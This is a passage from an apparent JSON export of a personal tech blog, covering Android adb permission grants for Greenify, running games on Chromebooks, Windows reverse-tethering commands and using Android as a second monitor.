Greenify type the following in adb to give it dump permission.\r\n\r\n Step 1: Install USB Drivers\r\n\r\nspan style=\"color: #2a1e1e;\"First, you need to install ADB tools along with the necessary drivers. I provided a link above to a toolkit which will automate the whole process./span\r\n\r\nStep 2: Enable USB Debugging\r\n\r\nspan style=\"color: 2a1e1e;\"To enable USB debugging go to your settings menu, then developer options, and enable usbDebugging.  If you don&#8217;t see developer options, go to /spanem id=\"yui3_1721_1404139973977703\" style=\"color: #2a1e1e;\"about phone/emspan style=\"color: #2a1e1e;\" and tap the/spanem style=\"color: #2a1e1e;\" /embuild number 10span style=\"color: #2a1e1e;\" times.  It should prompt you that &#8220;You are now a developer&#8221; and from there you should see developer options. Go inside and enable USB debugging./span\r\n\r\n\r\n\r\nHere are the adb commands that you need to enter:\r\n  \r\nAggressive Doze:\r\n\r\npreadb -d shell pm grant com.oasisfeng.greenify android.permission.DUMP\r\n/pre\r\n\r\nWake-up Tracker:\r\n\r\npreadb -d shell pm grant com.oasisfeng.greenify android.permission.READ_LOGS\r\n\r\n/pre\r\n\r\nThis will allow Greenify to activate doze regardless of the current motion sensing. So this will allow your device to enter doze as long as the screen is off and not charging. So far it has worked well for me, so let me know how it works for you.\r\n\r\n [1]: http://www.davebennett.tv/wp-content/uploads/2014/06/Screenshot_2014-07-06-23-19-41.png\r\n",
        "tags": [
            "android",
            "battery",
            "better battery",
            "doze",
            "greenify",
            "save"
        ]
    },
    {
        "uri": "/league-on-chromebook/",
        "title": "League on Chromebook",
        "content": "I have received many requests to do a video of League on Chromebook. Well, it shouldn&#8217;t be too surprising that it works. All it takes is a href=\"http://www.davebennett.tech/install-windows-10-on-chromebook/\" target=\"_blank\" rel=\"noopener\"running Windows on your Chromebook/a. The biggest limitation that I face was the insufficient hard drive space on my Chromebook (Acer C720). To solve that issue, I installed League to a flash drive. Of course, this had a negative effect on the game&#8217;s load time. It took about 10 minutes until I finally got in game. Also, I should mention that you are going to need to connect an external keyboard and mouse. There aren&#8217;t any drivers to make use of the on board keyboard or mouse.\n\nIn game it didn&#8217;t get any better. My FPS did not reach any higher than 8. Honestly, I am somewhat surprise considering that Chromebooks are able to play a href=\"http://www.davebennett.tech/counter-strike-global-offensive-on-chromebook/\" target=\"blank\" rel=\"noopener\"Steam games/a and a href=\"http://www.davebennett.tech/how-to-play-ps2-games-on-chromebook/\" target=\"blank\" rel=\"noopener\"PlayStation 2 games/a. This might just be a driver limitation or video acceleration not working. In any case, definitely give it a try!\n\n{{ ad }}\n\nWhat about Crouton and Linux?\n\nAs an aside, I tried to get this working using PlayOnLinux within Ubuntu on my Chromebook. It was very buggy and wouldn&8217;t completely install. Ymmv though.\n",
        "tags": [
            "chromebook",
            "emulation",
            "league",
            "league on chromebook",
            "windows 10 chromebook",
            "windows on chromebook"
        ]
    },
    {
        "uri": "/least-used-android-features/",
        "title": "Least Used Android Features",
        "content": "{{ youtube JTIpsu6nPkw }}\r\n\r\nThere are a lot of cool features on Android, but you might not actually have a use for them. Here are some of my least used features of Android.\r\n",
        "tags": [
            "android",
            "face unlock",
            "features",
            "least",
            "now on tap",
            "screen pinning",
            "used"
        ]
    },
    {
        "uri": "/hearthstone-on-chromebook-2/",
        "title": "Hearthstone on Chromebook",
        "content": "Hearthstone is a very popular game which I coincidentally don&#8217;t play. However, I do spend quite a lot of time on my Chromebook and love seeing how far I can push its compatibility with software. Naturally, the idea of running Hearthstone on Chromebook appealed to me. After all, a href=\"http://www.davebennett.tech/counter-strike-global-offensive-on-chromebook/\" target=\"blank\" rel=\"noopener\"Counter Strike/a, a href=\"https://www.youtube.com/watch?v=qHi2WzfvtwI\" target=\"blank\" rel=\"noopener\"TeamFortress/a and a href=\"http://www.davebennett.tech/how-to-play-ps2-games-on-chromebook/\" target=\"_blank\" rel=\"noopener\"PlayStation 2/a games work, so I don&#8217;t see why Hearthstone wouldn&#8217;t.\n\nIf you haven&#8217;t guessed already, we are going to be using Linux to make this work. This is because Linux has the popular Play On Linux software which allows Windows games to be played on Linux (to an extent). This also means that you will need to have an  x86 Intel powered Chromebook.\n\n{{ ad }}\n\nWhat You Will Need:\n\n  a href=\"http://www.davebennett.tech/install-ubuntu-14-04-on-chromebook/\" target=\"_blank\" rel=\"noopener\"Chromebook with Linux Installed/a\n  a href=\"https://us.battle.net/account/download/?show=hearthstone&style=hearthstone\" target=\"_blank\" rel=\"noopener\"Heartstone/a\n\n Step 1: Install Play On Linux\n\nI am going to assume that you are using Ubuntu and that you already have the Ubuntu Software center installed. Within the software center search for Play On Linux. Install and Launch the App.\n\nimg class=\"alignnone size-medium wp-image-1586\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/HearthStone.00004217.Still002-300x169.jpg\" alt=\"Hearthstone Play on Linux\" width=\"300\" height=\"169\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00004217.Still002-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00004217.Still002-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00004217.Still002-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.000042_17.Still002.jpg 1280w\" sizes=\"(max-width: 300px) 100vw, 300px\" /\n\nStep 2: Setting Up Hearthstone\n\nAfter you launch Play on Linux, click the button that reads install. Search for Hearthstone. It&8217;s going to give you a warning that it&#8217;s still in testing. Select Install. From this point, it is going to create the virtual drive and prompt you install the Microsoft fonts.\n\n img class=\"alignnone size-medium wp-image-1588\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/HearthStone.00010618.Still001-300x169.jpg\" alt=\"HearthStone.00010618.Still001\" width=\"300\" height=\"169\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00010618.Still001-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00010618.Still001-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00010618.Still001-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00010618.Still001.jpg 1280w\" sizes=\"(max-width: 300px) 100vw, 300px\" /img class=\"alignnone size-medium wp-image-1587\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/HearthStone.00010329.Still003-300x169.jpg\" alt=\"Hearthstone Play on Linux\" width=\"300\" height=\"169\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00010329.Still003-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00010329.Still003-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00010329.Still003-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.000103_29.Still003.jpg 1280w\" sizes=\"(max-width: 300px) 100vw, 300px\" /\n\nStep 3: Oh no, I&8217;m stuck\n\n{{ ad }}\n\nYou will most likely get stuck at the language selection. It&#8217;s going to prompt you to select a language but there aren&#8217;t any to choose from. This is the point that we are going to launch the Hearthstone install executable. Close the current window. Then go to configure and select the drive that reads hearthstone. Go to the miscellaneous **tab and select the button to **run an .exe in this directory. From there, select the Hearthstone executable from the link above. Afterwards, you should see a language selection window appear and the install should resume like usual. Make sure to keep all the options default.\n\nimg class=\"alignnone size-medium wp-image-1592\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/HearthStone.00011923.Still008-300x169.jpg\" alt=\"Hearthstone Language to Install\" width=\"300\" height=\"169\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00011923.Still008-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00011923.Still008-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00011923.Still008-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00011923.Still008.jpg 1280w\" sizes=\"(max-width: 300px) 100vw, 300px\" / img class=\"alignnone size-medium wp-image-1589\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/HearthStone.00013620.Still006-300x169.jpg\" alt=\"Hearthstone Chromebook\" width=\"300\" height=\"169\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00013620.Still006-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00013620.Still006-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00013620.Still006-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00013620.Still006.jpg 1280w\" sizes=\"(max-width: 300px) 100vw, 300px\" /img class=\"alignnone size-medium wp-image-1590\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/HearthStone.00014423.Still007-300x169.jpg\" alt=\"Hearthstone Chromebook\" width=\"300\" height=\"169\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00014423.Still007-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00014423.Still007-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00014423.Still007-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00014423.Still007.jpg 1280w\" sizes=\"(max-width: 300px) 100vw, 300px\" /img class=\"alignnone size-medium wp-image-1593\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/HearthStone.00015427.Still009-300x169.jpg\" alt=\"Hearthstone Select Language\" width=\"300\" height=\"169\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00015427.Still009-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00015427.Still009-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00015427.Still009-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00015427.Still009.jpg 1280w\" sizes=\"(max-width: 300px) 100vw, 300px\" /\n\nOnce the install finishes, you should be at the battle.net login window. You should be good to go from this point. I don&8217;t have an account (nor do I want one) so I did not try signing it. Give it a try and tell me how it goes!\n\nimg class=\"alignnone size-medium wp-image-1591\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/HearthStone.00030018.Still005-300x169.jpg\" alt=\"Hearthstone Chromebook Login\" width=\"300\" height=\"169\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00030018.Still005-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00030018.Still005-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00030018.Still005-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.000300_18.Still005.jpg 1280w\" sizes=\"(max-width: 300px) 100vw, 300px\" /\n\n&nbsp;\n",
        "tags": [
            "chrome",
            "chromebook",
            "crouton",
            "emulation",
            "game",
            "hearthstone",
            "linux"
        ]
    },
    {
        "uri": "/hearthstone-on-chromebook/",
        "title": "Hearthstone on Chromebook",
        "content": "Hearthstone is a very popular game which I coincidentally don&#8217;t play. However, I do spend quite a lot of time on my Chromebook and love seeing how far I can push its compatibility with software. Naturally, the idea of running Hearthstone on Chromebook appealed to me. After all, a href=\"http://www.davebennett.tech/counter-strike-global-offensive-on-chromebook/\" target=\"blank\" rel=\"noopener\"Counter Strike/a, a href=\"https://www.youtube.com/watch?v=qHi2WzfvtwI\" target=\"blank\" rel=\"noopener\"TeamFortress/a and a href=\"http://www.davebennett.tech/how-to-play-ps2-games-on-chromebook/\" target=\"_blank\" rel=\"noopener\"PlayStation 2/a games work, so I don&#8217;t see why Hearthstone wouldn&#8217;t.\n\nIf you haven&#8217;t guessed already, we are going to be using Linux to make this work. This is because Linux has the popular Play On Linux software which allows Windows games to be played on Linux (to an extent). This also means that you will need to have an  x86 Intel powered Chromebook.\n\n{{ ad }}\n\nWhat You Will Need:\n\n  a href=\"http://www.davebennett.tech/install-ubuntu-14-04-on-chromebook/\" target=\"_blank\" rel=\"noopener\"Chromebook with Linux Installed/a\n  a href=\"https://us.battle.net/account/download/?show=hearthstone&style=hearthstone\" target=\"_blank\" rel=\"noopener\"Heartstone/a\n\n Step 1: Install Play On Linux\n\nI am going to assume that you are using Ubuntu and that you already have the Ubuntu Software center installed. Within the software center search for Play On Linux. Install and Launch the App.\n\nimg class=\"alignnone size-medium wp-image-1586\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/HearthStone.00004217.Still002-300x169.jpg\" alt=\"Hearthstone Play on Linux\" width=\"300\" height=\"169\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00004217.Still002-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00004217.Still002-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00004217.Still002-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.000042_17.Still002.jpg 1280w\" sizes=\"(max-width: 300px) 100vw, 300px\" /\n\nStep 2: Setting Up Hearthstone\n\nAfter you launch Play on Linux, click the button that reads install. Search for Hearthstone. It&8217;s going to give you a warning that it&#8217;s still in testing. Select Install. From this point, it is going to create the virtual drive and prompt you install the Microsoft fonts.\n\n img class=\"alignnone size-medium wp-image-1588\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/HearthStone.00010618.Still001-300x169.jpg\" alt=\"HearthStone.00010618.Still001\" width=\"300\" height=\"169\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00010618.Still001-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00010618.Still001-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00010618.Still001-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00010618.Still001.jpg 1280w\" sizes=\"(max-width: 300px) 100vw, 300px\" /img class=\"alignnone size-medium wp-image-1587\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/HearthStone.00010329.Still003-300x169.jpg\" alt=\"Hearthstone Play on Linux\" width=\"300\" height=\"169\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00010329.Still003-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00010329.Still003-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00010329.Still003-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.000103_29.Still003.jpg 1280w\" sizes=\"(max-width: 300px) 100vw, 300px\" /\n\nStep 3: Oh no, I&8217;m stuck\n\n{{ ad }}\n\nYou will most likely get stuck at the language selection. It&#8217;s going to prompt you to select a language but there aren&#8217;t any to choose from. This is the point that we are going to launch the Hearthstone install executable. Close the current window. Then go to configure and select the drive that reads hearthstone. Go to the miscellaneous **tab and select the button to **run an .exe in this directory. From there, select the Hearthstone executable from the link above. Afterwards, you should see a language selection window appear and the install should resume like usual. Make sure to keep all the options default.\n\nimg class=\"alignnone size-medium wp-image-1592\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/HearthStone.00011923.Still008-300x169.jpg\" alt=\"Hearthstone Language to Install\" width=\"300\" height=\"169\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00011923.Still008-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00011923.Still008-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00011923.Still008-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00011923.Still008.jpg 1280w\" sizes=\"(max-width: 300px) 100vw, 300px\" / img class=\"alignnone size-medium wp-image-1589\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/HearthStone.00013620.Still006-300x169.jpg\" alt=\"Hearthstone Chromebook\" width=\"300\" height=\"169\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00013620.Still006-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00013620.Still006-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00013620.Still006-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00013620.Still006.jpg 1280w\" sizes=\"(max-width: 300px) 100vw, 300px\" /img class=\"alignnone size-medium wp-image-1590\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/HearthStone.00014423.Still007-300x169.jpg\" alt=\"Hearthstone Chromebook\" width=\"300\" height=\"169\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00014423.Still007-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00014423.Still007-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00014423.Still007-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00014423.Still007.jpg 1280w\" sizes=\"(max-width: 300px) 100vw, 300px\" /img class=\"alignnone size-medium wp-image-1593\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/HearthStone.00015427.Still009-300x169.jpg\" alt=\"Hearthstone Select Language\" width=\"300\" height=\"169\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00015427.Still009-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00015427.Still009-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00015427.Still009-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00015427.Still009.jpg 1280w\" sizes=\"(max-width: 300px) 100vw, 300px\" /\n\nOnce the install finishes, you should be at the battle.net login window. You should be good to go from this point. I don&8217;t have an account (nor do I want one) so I did not try signing it. Give it a try and tell me how it goes!\n\nimg class=\"alignnone size-medium wp-image-1591\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/HearthStone.00030018.Still005-300x169.jpg\" alt=\"Hearthstone Chromebook Login\" width=\"300\" height=\"169\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00030018.Still005-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00030018.Still005-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.00030018.Still005-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/06/HearthStone.000300_18.Still005.jpg 1280w\" sizes=\"(max-width: 300px) 100vw, 300px\" /\n\n&nbsp;\n",
        "tags": [
            "chrome",
            "chromebook",
            "crouton",
            "emulation",
            "game",
            "hearthstone",
            "linux"
        ]
    },
    {
        "uri": "/whats-on-my-phone/",
        "title": "What’s on my Phone",
        "content": "{{ youtube ryVhhmHLX7Q }}\r\n\r\nWhat&#8217;s on my phone? I want to share with you some of the Android apps that I use on my phone everyday.\r\n\r\nAndroid Customization:\r\n\r\n  a href=\"https://play.google.com/store/apps/details?id=com.teslacoilsw.launcher.prime\" target=\"_blank\"Nova Launcher/a\r\n  a href=\"https://play.google.com/store/apps/details?id=com.Fraom.IrideUIisHipster\" target=\"_blank\"Iride UI is Hipster/a\r\n  a href=\"https://play.google.com/store/apps/details?id=org.zooper.zwpro\" target=\"_blank\"Zooper Widget/a\r\n  a href=\"https://play.google.com/store/apps/details?id=com.typographicaltheme.zwskin\" target=\"_blank\"Zooper Widget Theme/a\r\n\r\n Productivity:\r\n\r\n  a href=\"https://play.google.com/store/apps/details?id=com.google.android.keep\" target=\"_blank\"Google Keep/a\r\n  a href=\"https://play.google.com/store/apps/details?id=com.todoist\" target=\"_blank\"Todoist/a\r\n  a href=\"https://play.google.com/store/apps/details?id=com.google.android.apps.inbox\" target=\"_blank\"Inbox/a\r\n  a href=\"https://play.google.com/store/apps/details?id=com.evernote\" target=\"_blank\"Evernote/a\r\n  a href=\"https://play.google.com/store/apps/details?id=com.plusonelabs.calendar\" target=\"_blank\"Calendar Widget/a\r\n\r\nTexting:\r\n\r\n  a href=\"https://play.google.com/store/apps/details?id=com.textra\" target=\"_blank\"Textra/a\r\n\r\n Social:\r\n\r\n  a href=\"https://play.google.com/store/apps/details?id=org.buffer.android\" target=\"_blank\"Buffer/a\r\n  a href=\"https://play.google.com/store/apps/details?id=it.mvilla.android.fenix\" target=\"_blank\"Fenix/a\r\n  a href=\"https://play.google.com/store/apps/details?id=com.laurencedawson.redditsync\" target=\"blank\"Sync for Reddit/a\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n",
        "tags": [
            "android",
            "apps",
            "best",
            "customization",
            "my",
            "phone",
            "whats"
        ]
    },
    {
        "uri": "/reverse-tether/",
        "title": "Reverse Tether",
        "content": "{{ youtube ueM2yAPGKBk }}\r\n\r\nHave you ever been stuck in a situation that you needed WiFi but only had an Ethernet connection available? Unless you&#8217;re looking to a href=\"https://www.youtube.com/watch?v=uisnj8Xufp0\" target=\"_blank\"connect your phone to an Ethernet connection/a, you would be all out of options. I found myself in a similar situation when I needed to setup a live stream using a bunch of laptops and only one Ethernet connection with no WiFi available. This is also useful if you are looking to avoid using mobile data.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nReverse tethering will allow you to turn your computer into a WiFi hotspot. For this tutorial we are going to use Windows, but I am positive that there are ways to accomplish this on Linux. Just know that you will need to have a computer or laptop with an active Ethernet connection along with a WiFi adapter (or built in-WiFi adapter). And sorry, this will not work for Surface Pro 3 or 4 users (driver incompatibility).\r\n\r\nWhat you Will Need:\r\n\r\n  Windows Laptop or Desktop\r\n\r\n Check Compatibility:\r\n\r\nFirst you need to check if your WiFi driver supports hosted network. Open up command prompt (admin) and type in the following:\r\n\r\nprenetsh wlan show drivers/pre\r\n\r\nCheck for the line that reads supports hosted network. If the output is Yes then you are good to proceed. If not, this procedure won&#8217;t work with your current Wifi adapter or driver. You can try updating your driver from device manager to see if it will make a difference.\r\n\r\nimg class=\"alignnone size-large wp-image-1608\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/07/wlan-show-hosted-drivers-1024x576.jpg\" alt=\"netsh wlan show drivers\" width=\"1024\" height=\"576\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/07/wlan-show-hosted-drivers-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/07/wlan-show-hosted-drivers-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/07/wlan-show-hosted-drivers-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/07/wlan-show-hosted-drivers.jpg 1280w\" sizes=\"(max-width: 1024px) 100vw, 1024px\" /\r\n\r\nEnabling Host Adapter:\r\n\r\nEven though your Wifi driver supports hosted networks, it is probably not enabled. To enable Microsoft Network Hosted Virtual Adapter, _go into device manager and select the tab that reads _network adapters. You should see something that reads Microsoft Network Hosted Virtual Adapter._ Right-click it, and select enable (if it isn&8217;t already). If you don&#8217;t see it, go to _view and select show hidden devices. It should now appear on the list.\r\n\r\nimg class=\"alignnone size-large wp-image-1611\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/07/20160702093320-1024x576.jpg\" alt=\"Microsoft Hosted Network Adapter\" width=\"1024\" height=\"576\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/07/20160702093320-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/07/20160702093320-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/07/20160702093320-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/07/20160702_093320.jpg 1280w\" sizes=\"(max-width: 1024px) 100vw, 1024px\" /\r\n\r\nSetup Network:\r\n\r\nType in the following to create the hosted network:\r\n\r\nprenetsh wlan set hostednetwork mode=allow ssid=networkName key=networkpsswd/pre\r\n\r\nType in the following to start the network:\r\n\r\nprenetsh wlan start hostednetwork\r\n/pre\r\n\r\nYou might receive an error about the network not able to be started. If that is the case, go into your network connections and disable and then enable your Wifi connection and try the previous command again.\r\n\r\n Sharing Connection:\r\n\r\nFinally, go to _network connections _and share your Ethernet connection\r\n\r\n\r\n\r\nConnecting from Android:\r\n\r\nTo connect to the network from your Android (or iOS) device, you will need to use a static IP address that&8217;s within the hosted network&#8217;s domain. It most likely will be 192.168.137.xxx. Likewise, the gateway for the hosted network will most likely be _192.168.137.1. _You can always check this by going into network connections, and checking the properties of the IPv4  address of the hosted network. Lastly, use Google&#8217;s DNS as your dns server (8.8.8.8 and 8.8.4.4)\r\n\r\n\r\n\r\nConnecting from Windows:\r\n\r\nTo connect from another Windows device, go into network connections and specify Google&8217;s DNS as your DNS server. You can leave the option to obtain an IP address atomically or use a static one like above; either option should work.\r\n\r\n img class=\"alignnone wp-image-1613 size-large\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/07/20160702093458-1024x576.jpg\" alt=\"TCIP Settings\" width=\"1024\" height=\"576\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/07/20160702093458-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/07/20160702093458-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/07/20160702093458-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/07/20160702093458.jpg 1280w\" sizes=\"(max-width: 1024px) 100vw, 1024px\" /img class=\"alignnone wp-image-1614 size-large\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/07/20160702093528-1024x576.jpg\" alt=\"Google DNS\" width=\"1024\" height=\"576\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/07/20160702093528-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/07/20160702093528-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/07/20160702093528-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/07/20160702093528.jpg 1280w\" sizes=\"(max-width: 1024px) 100vw, 1024px\" /\r\n\r\nYou might also need to perform an IP flush. To do so, enter the following from command prompt (admin):\r\n\r\nprestrongipconfig /release/strong\r\n\r\n strongipconfig /renew/strong/pre\r\n\r\nThat&#8217;s it. From this point you should be connected to the hosted network and have internet access. Theoretically, you can connect well over 50 devices to this hosted network.\r\n",
        "tags": [
            "android",
            "computer",
            "connection",
            "hotspot",
            "internet",
            "ios",
            "reverse",
            "reverse tethering",
            "share",
            "tether",
            "wifi"
        ]
    },
    {
        "uri": "/top-samsung-galaxy-android-apps/",
        "title": "Top Samsung Galaxy Apps",
        "content": "{{ youtube oaJq5gZN-cU }}\r\n\r\nHere is my pick for some of the most useful Samsung Galaxy apps.\r\n",
        "tags": [
            "apps",
            "favorite",
            "galaxy",
            "samsung",
            "top"
        ]
    },
    {
        "uri": "/usb-condom-micflip/",
        "title": "USB Condom & MicFlip",
        "content": "{{ youtube I-tBo2_eR48 }}\r\n\r\nSo here is some interesting tech under $25 that I have been using.\r\n  \r\nUSB Condom: https://goo.gl/HkUacx\r\n  \r\nMicFlip: https://goo.gl/Ui7fkb\r\n",
        "tags": [
            "cheap",
            "condom",
            "gadgets",
            "micflip",
            "reversible",
            "tech",
            "usb"
        ]
    },
    {
        "uri": "/oneplus-3-unboxing/",
        "title": "Oneplus 3 Unboxing",
        "content": "{{ youtube oqM0seHyd9c }}\r\n\r\nLet&#8217;s unbox the Oneplus 3!\r\n",
        "tags": [
            "budget",
            "oneplus",
            "oneplus 3",
            "unboxing"
        ]
    },
    {
        "uri": "/oneplus-3-review-2/",
        "title": "Oneplus 3 Review",
        "content": "{{ youtube NQxhowuRBTs }}\r\n\r\nAfter using the Oneplus for a week, I want to share my opinion of the device. Mainly focusing on the things that I really liked about it and the things that I didn&#8217;t like.\r\n",
        "tags": [
            "budget",
            "oneplus",
            "oneplus 3",
            "phone",
            "review"
        ]
    },
    {
        "uri": "/oneplus-3-review/",
        "title": "Oneplus 3 Review",
        "content": "{{ youtube NQxhowuRBTs }}\r\n\r\nAfter using the Oneplus for a week, I want to share my opinion of the device. Mainly focusing on the things that I really liked about it and the things that I didn&#8217;t like.\r\n",
        "tags": [
            "budget",
            "oneplus",
            "oneplus 3",
            "phone",
            "review"
        ]
    },
    {
        "uri": "/use-android-as-second-monitor/",
        "title": "Use Android as Second Monitor",
        "content": "{{ youtube POpctRaXkrk }}\r\n\r\nHaving more than one monitor is useful for any power user (porn on one, games on another). So it&#8217;s possible to use an android device as a secondary monitor, but I recommend actually buying one if you want an easy setup. With that said, if you have a spare Android device laying around, you can use it as another monitor in your setup. To do this,  we are going to use Windows and &#8220;trick&#8221; it into thinking that you have another monitor connected and then use TeamViewer to access the &#8220;fake&#8221; monitor. This trick will only work with computers and laptops that have an extra VGA port. DVI and HDMI will not work with this.  Here&#8217;s how to use Android as Second Monitor:\r\n\r\nWhat you will need:\r\n\r\n  Windows Computer with VGA Port\r\n  VGA Cable\r\n  a href=\"https://www.teamviewer.com/en/\" target=\"_blank\"TeamViewer/a\r\n\r\n Step 1: Creating your fake monitor\r\n\r\nGo into control panel and display settings. Select the button that is labeled detect. Another monitor will appear neext to your main one. Go to the dropdown menu and select the option connect to VGA anyway. Then select the link that reads project to a second screen. When the Window&#8217;s charm menu appears, select the option that says extends.\r\n\r\n\r\n\r\nStep 2: TeamViewer\r\n\r\nDownload and Install TeamViewer. Then go into Extras _and _Advanced Options and select the button to install the monitor driver.\r\n\r\n\r\n\r\n&nbsp;\r\n\r\n Final Thoughts:\r\n\r\nLike I mentioned, using Android as second monitor is really cool but not a practical solution. There is some latency lag due to your network and switching between monitors can be a pain. However, it&#8217;s still worth a try and provides a nice free solution over the paid apps.\r\n\r\nimg class=\"alignnone wp-image-1646 size-large\" 